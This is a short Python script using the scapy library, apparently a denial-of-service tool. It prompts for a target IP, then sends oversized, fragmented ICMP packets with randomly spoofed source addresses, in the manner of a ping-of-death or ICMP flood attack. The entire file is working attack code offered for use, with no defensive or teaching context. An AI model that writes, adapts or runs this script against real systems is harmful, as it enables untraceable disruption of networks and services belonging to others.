from scapy.all import *

def main():
    icmpflood()

def icmpflood():
    target = DestinationIP()
    byte = input("How many byte do you sent [Press enter for 65500]: ")
    if byte == "":
        byte = 65500
    num = input("How many packet do you sent [Press enter for 1]: ")
    if num == "":
        num = 1
    else:
        num = int(num)

    ip_hdr = IP(src = RandIP(), dst=target, proto="icmp")
    packet = ip_hdr/ICMP()/("A"*int(byte))

    fragments = fragment(packet)

    while num :
        send(fragments)
        num-=1
        
def DestinationIP():
    dstIP = input("Destination IP: ")
    return dstIP
    
main()
